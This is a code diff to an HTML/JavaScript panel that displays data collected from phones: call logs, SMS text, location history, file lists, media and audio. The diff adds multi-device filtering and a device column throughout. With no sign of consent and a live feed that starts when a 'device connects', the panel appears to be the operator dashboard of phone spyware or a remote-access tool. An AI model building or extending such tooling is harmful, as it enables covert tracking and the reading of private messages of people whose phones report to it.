@@ -163,6 +163,20 @@ tr:hover td { background: rgba(79,140,255,.05); }
 .tag.file { background: rgba(192,132,252,.14); color: #c084fc; }
 .tag.loc { background: rgba(251,191,36,.14); color: var(--warn); }
 .tag.other { background: rgba(139,155,184,.14); color: var(--muted); }
+.devrow { display: flex; gap: 8px; overflow-x: auto; padding: 2px 2px 14px; scrollbar-width: none; }
+.devrow::-webkit-scrollbar { display: none; }
+.devchip {
+  flex: 0 0 auto; padding: 7px 14px; border-radius: 999px;
+  border: 1px solid var(--line); background: var(--card);
+  color: var(--muted); font-weight: 600; font-size: .78rem; cursor: pointer; transition: .15s;
+}
+.devchip.on { background: rgba(79,140,255,.18); border-color: var(--accent); color: var(--accent2); }
+.devtag {
+  display: inline-block; padding: 2px 8px; border-radius: 6px;
+  font-size: .64rem; font-weight: 700;
+  background: rgba(79,140,255,.14); color: var(--accent);
+  margin-right: 6px;
+}
 
 /* ---------- Media grid ---------- */
 .mgrid { display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 14px; }
@@ -247,6 +261,8 @@ footer { text-align: center; color: var(--muted); font-size: .72rem; padding: 30
     <div class="stat c-files"><div class="ic">📁</div><div class="num" id="s-files">0</div><div class="lbl">Files</div></div>
   </div>
 
+  <div class="devrow" id="devrow"></div>
+
   <div class="tabs" id="tabs">
     <button class="tab on" data-p="dashboard">📊 Dashboard</button>
     <button class="tab" data-p="media">📷 Media <span class="cnt" id="t-media"></span></button>
@@ -295,7 +311,7 @@ footer { text-align: center; color: var(--muted); font-size: .72rem; padding: 30
     <div class="head"><h2>📞 Call Logs</h2></div>
     <div class="tablewrap">
       <table>
-        <thead><tr><th>Time</th><th>Type</th><th>Number</th><th>Name</th><th>Duration</th><th>Raw Data</th></tr></thead>
+        <thead><tr><th>Time</th><th>Type</th><th>Number</th><th>Name</th><th>Duration</th><th>Raw Data</th><th>Device</th></tr></thead>
         <tbody id="tb-calls"></tbody>
       </table>
     </div>
@@ -306,7 +322,7 @@ footer { text-align: center; color: var(--muted); font-size: .72rem; padding: 30
     <div class="head"><h2>💬 SMS / MMS</h2></div>
     <div class="tablewrap">
       <table>
-        <thead><tr><th>Time</th><th>Type</th><th>Number</th><th>Message</th><th>Endpoint</th></tr></thead>
+        <thead><tr><th>Time</th><th>Type</th><th>Number</th><th>Message</th><th>Endpoint</th><th>Device</th></tr></thead>
         <tbody id="tb-sms"></tbody>
       </table>
     </div>
@@ -317,7 +333,7 @@ footer { text-align: center; color: var(--muted); font-size: .72rem; padding: 30
     <div class="head"><h2>📍 Location History</h2></div>
     <div class="tablewrap">
       <table>
-        <thead><tr><th>Time</th><th>Latitude</th><th>Longitude</th><th>Accuracy</th><th>Address</th><th>Map</th></tr></thead>
+        <thead><tr><th>Time</th><th>Latitude</th><th>Longitude</th><th>Accuracy</th><th>Address</th><th>Map</th><th>Device</th></tr></thead>
         <tbody id="tb-loc"></tbody>
       </table>
     </div>
@@ -328,7 +344,7 @@ footer { text-align: center; color: var(--muted); font-size: .72rem; padding: 30
     <div class="head"><h2>📁 File Explorer</h2></div>
     <div class="tablewrap">
       <table>
-        <thead><tr><th>Time</th><th>File Name</th><th>Path</th><th>Size</th><th>Endpoint</th></tr></thead>
+        <thead><tr><th>Time</th><th>File Name</th><th>Path</th><th>Size</th><th>Endpoint</th><th>Device</th></tr></thead>
         <tbody id="tb-files"></tbody>
       </table>
     </div>
@@ -346,7 +362,7 @@ footer { text-align: center; color: var(--muted); font-size: .72rem; padding: 30
     <input class="search" id="search" placeholder="🔍 Search endpoint, number, text..." oninput="renderAll()">
     <div class="tablewrap">
       <table>
-        <thead><tr><th>Time</th><th>Endpoint</th><th>Type</th><th>Data</th><th>IP</th></tr></thead>
+        <thead><tr><th>Time</th><th>Endpoint</th><th>Type</th><th>Data</th><th>IP</th><th>Device</th></tr></thead>
         <tbody id="tb-all"></tbody>
       </table>
     </div>
@@ -361,6 +377,13 @@ var DATA = [];
 var auto = true;
 var mediaFilter = "all";
 var timer = null;
+var deviceFilter = "all";
+
+function devName(c) {
+  if (c.deviceName) return c.deviceName;
+  if (c.deviceId && c.deviceId !== "0") return "Device #" + c.deviceId;
+  return "—";
+}
 
 function esc(s) {
   return String(s == null ? "" : s)
@@ -452,11 +475,13 @@ function exportJSON() {
 }
 
 /* ---------- rendering ---------- */
+var VIEW = [];
 function renderAll() {
-  var k, counts = { total: DATA.length, media: 0, calls: 0, sms: 0, loc: 0, files: 0, other: 0 };
+  VIEW = deviceFilter === "all" ? DATA.slice() : DATA.filter(function (c) { return String(c.deviceId || "0") === deviceFilter; });
+  var k, counts = { total: VIEW.length, media: 0, calls: 0, sms: 0, loc: 0, files: 0, other: 0 };
   var byKind = { media: [], calls: [], sms: [], loc: [], files: [], other: [] };
   var epCounts = {};
-  DATA.forEach(function (c) {
+  VIEW.forEach(function (c) {
     var k = kindOf(c.path);
     if (isMedia(k)) { counts.media++; byKind.media.push(c); }
     else if (k === "sms" || k === "mms") { counts.sms++; byKind.sms.push(c); }
@@ -472,8 +497,9 @@ function renderAll() {
   set("t-media", counts.media || ""); set("t-calls", counts.calls || ""); set("t-sms", counts.sms || "");
   set("t-loc", counts.loc || ""); set("t-files", counts.files || ""); set("t-all", counts.total || "");
 
-  if (DATA.length) set("lastact", "Latest: " + fmtTime(DATA[0].time));
+  if (VIEW.length) set("lastact", "Latest: " + fmtTime(VIEW[0].time));
 
+  renderDevices(VIEW);
   renderEps(epCounts);
   renderMedia(byKind.media);
   renderCalls(byKind.calls);
@@ -485,6 +511,28 @@ function renderAll() {
 }
 
 function set(id, v) { var el = document.getElementById(id); if (el) el.textContent = v; }
+
+function renderDevices(view) {
+  var row = document.getElementById("devrow");
+  var seen = {};
+  var order = [];
+  view.forEach(function (c) {
+    var id = String(c.deviceId || "0");
+    if (!seen[id]) {
+      seen[id] = true;
+      order.push({ id: id, name: c.deviceName || (id === "0" ? "Unknown" : "Device #" + id) });
+    }
+  });
+  var chips = '<button class="devchip' + (deviceFilter === "all" ? " on" : "") + '" onclick="setDeviceFilter(\'all\')">📱 All Devices</button>';
+  order.forEach(function (d) {
+    chips += '<button class="devchip' + (deviceFilter === d.id ? " on" : "") + '" onclick="setDeviceFilter(\'' + d.id + '\')">📲 ' + esc(d.name) + '</button>';
+  });
+  row.innerHTML = chips;
+}
+function setDeviceFilter(id) {
+  deviceFilter = String(id);
+  renderAll();
+}
 
 function renderEps(epCounts) {
   var keys = Object.keys(epCounts).sort();
@@ -526,7 +574,7 @@ function renderMedia(list) {
     return '<div class="mcard"><div class="mthumb">' + thumb + '</div><div class="mbody">'
       + '<div class="mname" title="' + esc(name) + '">' + esc(name) + '</div>'
       + '<div class="mmeta"><span class="tag ' + mk + '">' + label + '</span><span>' + fmtSize(f && f.size) + '</span></div>'
-      + '<div class="mmeta">' + fmtTime(c.time) + '</div>'
+      + '<div class="mmeta"><span class="devtag">' + esc(devName(c)) + '</span>' + fmtTime(c.time) + '</div>'
       + (f && f.fileKey && mk === "audio" ? '<audio style="width:100%;margin-top:6px" controls src="/api/file/' + encodeURIComponent(f.fileKey) + '"></audio>' : "")
       + '</div></div>';
   }).join("");
@@ -534,7 +582,7 @@ function renderMedia(list) {
 
 function renderCalls(list) {
   var tb = document.getElementById("tb-calls");
-  if (!list.length) { tb.innerHTML = '<tr><td colspan="6" class="empty"><div class="big">📞</div><h3>No calls yet</h3></td></tr>'; return; }
+  if (!list.length) { tb.innerHTML = '<tr><td colspan="7" class="empty"><div class="big">📞</div><h3>No calls yet</h3></td></tr>'; return; }
   tb.innerHTML = list.map(function (c) {
     var f = c.fields || {};
     var type = String(f.type || f.callType || "").toLowerCase();
@@ -547,13 +595,14 @@ function renderCalls(list) {
       + '<td class="mono">' + esc(f.number || f.phoneNumber || "—") + '</td>'
       + '<td>' + esc(f.name || f.contact || "—") + '</td>'
       + '<td class="mono">' + esc(f.duration || f.data || "—") + '</td>'
-      + '<td class="mono muted clip">' + esc(JSON.stringify(f)).slice(0, 120) + '</td></tr>';
+      + '<td class="mono muted clip">' + esc(JSON.stringify(f)).slice(0, 120) + '</td>'
+      + '<td><span class="devtag">' + esc(devName(c)) + '</span></td></tr>';
   }).join("");
 }
 
 function renderSMS(list) {
   var tb = document.getElementById("tb-sms");
-  if (!list.length) { tb.innerHTML = '<tr><td colspan="5" class="empty"><div class="big">💬</div><h3>No SMS yet</h3></td></tr>'; return; }
+  if (!list.length) { tb.innerHTML = '<tr><td colspan="6" class="empty"><div class="big">💬</div><h3>No SMS yet</h3></td></tr>'; return; }
   tb.innerHTML = list.map(function (c) {
     var f = c.fields || {};
     var k = kindOf(c.path);
@@ -561,13 +610,14 @@ function renderSMS(list) {
       + '<td><span class="tag ' + (k === "mms" ? "mms" : "sms") + '">' + (k === "mms" ? "MMS" : "SMS") + '</span></td>'
       + '<td class="mono">' + esc(f.number || f.address || "—") + '</td>'
       + '<td class="clip">' + esc(f.data || f.body || f.message || "—") + '</td>'
-      + '<td class="mono muted">' + esc(c.path) + '</td></tr>';
+      + '<td class="mono muted">' + esc(c.path) + '</td>'
+      + '<td><span class="devtag">' + esc(devName(c)) + '</span></td></tr>';
   }).join("");
 }
 
 function renderLoc(list) {
   var tb = document.getElementById("tb-loc");
-  if (!list.length) { tb.innerHTML = '<tr><td colspan="6" class="empty"><div class="big">📍</div><h3>No location yet</h3></td></tr>'; return; }
+  if (!list.length) { tb.innerHTML = '<tr><td colspan="7" class="empty"><div class="big">📍</div><h3>No location yet</h3></td></tr>'; return; }
   tb.innerHTML = list.map(function (c) {
     var f = c.fields || {};
     var lat = f.latitude || f.lat, lng = f.longitude || f.lng;
@@ -578,13 +628,14 @@ function renderLoc(list) {
       + '<td class="mono">' + esc(lng || "—") + '</td>'
       + '<td class="mono">' + esc(f.accuracy || "—") + '</td>'
       + '<td class="clip">' + esc(f.address || "—") + '</td>'
-      + '<td>' + mapLink + '</td></tr>';
+      + '<td>' + mapLink + '</td>'
+      + '<td><span class="devtag">' + esc(devName(c)) + '</span></td></tr>';
   }).join("");
 }
 
 function renderFiles(list) {
   var tb = document.getElementById("tb-files");
-  if (!list.length) { tb.innerHTML = '<tr><td colspan="5" class="empty"><div class="big">📁</div><h3>No files yet</h3></td></tr>'; return; }
+  if (!list.length) { tb.innerHTML = '<tr><td colspan="6" class="empty"><div class="big">📁</div><h3>No files yet</h3></td></tr>'; return; }
   tb.innerHTML = list.map(function (c) {
     var f = c.fields || {};
     var fl = getF(c);
@@ -592,13 +643,14 @@ function renderFiles(list) {
       + '<td class="mono">' + esc(f.nameFile || (fl && fl.name) || "—") + '</td>'
       + '<td class="mono muted clip">' + esc(f.pathFile || "—") + '</td>'
       + '<td class="mono">' + fmtSize(fl && fl.size) + '</td>'
-      + '<td class="mono muted">' + esc(c.path) + '</td></tr>';
+      + '<td class="mono muted">' + esc(c.path) + '</td>'
+      + '<td><span class="devtag">' + esc(devName(c)) + '</span></td></tr>';
   }).join("");
 }
 
 function renderLive() {
   var fd = document.getElementById("feed");
-  var recent = DATA.slice(0, 10);
+  var recent = VIEW.slice(0, 10);
   if (!recent.length) { fd.innerHTML = '<div class="empty"><div class="big">📺</div><h3>Waiting for events...</h3><p>Device connect hone pe live feed yahan chalega.</p></div>'; return; }
   fd.innerHTML = recent.map(function (c) {
     return '<div class="fitem"><span class="t">' + fmtTime(c.time) + '</span><span class="p">' + esc(c.path) + '</span></div>';
@@ -608,21 +660,22 @@ function renderLive() {
 function renderAllTable() {
   var tb = document.getElementById("tb-all");
   var q = String((document.getElementById("search") || {}).value || "").toLowerCase();
-  var list = DATA;
+  var list = VIEW;
   if (q) {
-    list = DATA.filter(function (c) {
+    list = VIEW.filter(function (c) {
       var hay = (c.path + " " + JSON.stringify(c.fields || {}) + " " + (c.ip || "")).toLowerCase();
       return hay.indexOf(q) >= 0;
     });
   }
-  if (!list.length) { tb.innerHTML = '<tr><td colspan="5" class="empty"><div class="big">📋</div><h3>' + (q ? "No match" : "No requests yet") + '</h3></td></tr>'; return; }
+  if (!list.length) { tb.innerHTML = '<tr><td colspan="6" class="empty"><div class="big">📋</div><h3>' + (q ? "No match" : "No requests yet") + '</h3></td></tr>'; return; }
   tb.innerHTML = list.slice(0, 500).map(function (c) {
     var k = kindOf(c.path);
     return '<tr><td class="mono muted">' + fmtTime(c.time) + '</td>'
       + '<td class="mono" style="color:var(--accent2)">' + esc(c.path) + '</td>'
       + '<td><span class="tag ' + (isMedia(k) ? k : k) + '">' + k.toUpperCase() + '</span></td>'
       + '<td class="mono muted clip">' + esc(JSON.stringify(c.fields || {})).slice(0, 140) + '</td>'
-      + '<td class="mono muted">' + esc(c.ip || "—") + '</td></tr>';
+      + '<td class="mono muted">' + esc(c.ip || "—") + '</td>'
+      + '<td><span class="devtag">' + esc(devName(c)) + '</span></td></tr>';
   }).join("");
 }
 
@@ -640,7 +693,7 @@ function setMediaFilter(k, btn) {
   document.querySelectorAll("[data-mfilter]").forEach(function (b) { b.style.borderColor = ""; b.style.color = ""; });
   if (btn) { btn.style.borderColor = "var(--accent)"; btn.style.color = "var(--accent2)"; }
   var list = [];
-  DATA.forEach(function (c) { if (isMedia(kindOf(c.path))) list.push(c); });
+  VIEW.forEach(function (c) { if (isMedia(kindOf(c.path))) list.push(c); });
   var g = document.getElementById("mgrid");
   var filtered = list.filter(function (c) { return mediaFilter === "all" || mediaKind(c) === mediaFilter; });
   if (!filtered.length) { g.innerHTML = '<div class="empty" style="grid-column:1/-1"><div class="big">📷</div><h3>No media in this filter</h3></div>'; return; }
@@ -661,7 +714,7 @@ function setMediaFilter(k, btn) {
     return '<div class="mcard"><div class="mthumb">' + thumb + '</div><div class="mbody">'
       + '<div class="mname" title="' + esc(name) + '">' + esc(name) + '</div>'
       + '<div class="mmeta"><span class="tag ' + mk + '">' + label + '</span><span>' + fmtSize(f && f.size) + '</span></div>'
-      + '<div class="mmeta">' + fmtTime(c.time) + '</div></div></div>';
+      + '<div class="mmeta"><span class="devtag">' + esc(devName(c)) + '</span>' + fmtTime(c.time) + '</div></div></div>';
   }).join("");
 }
 
